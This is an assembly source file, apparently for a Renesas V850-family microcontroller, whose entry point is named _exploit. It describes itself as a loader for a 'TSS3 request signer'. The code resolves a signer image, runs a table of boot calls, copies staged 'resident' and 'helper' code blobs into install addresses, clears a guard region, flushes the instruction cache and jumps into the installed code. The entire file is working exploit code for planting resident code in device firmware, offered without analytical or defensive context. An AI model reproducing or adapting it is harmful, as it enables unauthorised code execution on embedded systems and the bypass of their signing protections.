/* One-shot self-resolving loader for the shared TSS3 request signer. */
#ifndef RESOLVER_OUTPUT_BASE
#error RESOLVER_OUTPUT_BASE is required
#endif
#ifndef STAGED_RESIDENT_BASE
#error STAGED_RESIDENT_BASE is required
#endif
#ifndef STAGED_HELPER_BASE
#error STAGED_HELPER_BASE is required
#endif
#ifndef INSTALL_RESIDENT_BASE
#error INSTALL_RESIDENT_BASE is required
#endif
#ifndef RESIDENT_SIZE
#error RESIDENT_SIZE is required
#endif
#ifndef RESIDENT_GUARD_SIZE
#error RESIDENT_GUARD_SIZE is required
#endif
#ifndef INSTALL_HELPER_BASE
#error INSTALL_HELPER_BASE is required
#endif
#ifndef HELPER_SIZE
#error HELPER_SIZE is required
#endif
#if (RESIDENT_SIZE & 3) != 0
#error RESIDENT_SIZE must be word-aligned
#endif
#if (RESIDENT_GUARD_SIZE & 3) != 0
#error RESIDENT_GUARD_SIZE must be word-aligned
#endif
#if (HELPER_SIZE & 3) != 0
#error HELPER_SIZE must be word-aligned
#endif
#if ((STAGED_RESIDENT_BASE | STAGED_HELPER_BASE | INSTALL_RESIDENT_BASE | INSTALL_HELPER_BASE) & 3) != 0
#error request-signer copy addresses must be word-aligned
#endif

    .section .text.entry,"ax"
    .global _exploit
_exploit:
    mov r0, r6
    mov RESOLVER_OUTPUT_BASE, r7
    jarl _resolve_request_signer_image, lp
    cmp r0, r10
    bne .L_fail

    mov RESOLVER_OUTPUT_BASE, r20
    mov 5, r21
.L_boot_calls:
    ld.w 0[r20], r12
    jarl [r12], lp
    add 4, r20
    add -1, r21
    cmp r0, r21
    bne .L_boot_calls
    cmp r0, r10
    bne .L_fail

    mov STAGED_RESIDENT_BASE, r6
    mov INSTALL_RESIDENT_BASE, r7
    movea RESIDENT_SIZE, r0, r8
.L_copy_resident:
    ld.w 0[r6], r9
    st.w r9, 0[r7]
    add 4, r6
    add 4, r7
    add -4, r8
    cmp r0, r8
    bne .L_copy_resident
    movea RESIDENT_GUARD_SIZE, r0, r8
.L_clear_resident_guard:
    st.w r0, 0[r7]
    add 4, r7
    add -4, r8
    cmp r0, r8
    bne .L_clear_resident_guard
    ld.w -4[r7], r9
    syncp
    synci

    mov STAGED_HELPER_BASE, r6
    mov INSTALL_HELPER_BASE, r7
    movea HELPER_SIZE, r0, r8
.L_copy_helper:
    ld.w 0[r6], r9
    st.w r9, 0[r7]
    add 4, r6
    add 4, r7
    add -4, r8
    cmp r0, r8
    bne .L_copy_helper
    ld.w -4[r7], r9
    syncp
    synci

    .global request_signer_resident_handoff
request_signer_resident_handoff:
    mov INSTALL_RESIDENT_BASE, r12
    jmp [r12]

.L_fail:
    br .L_fail
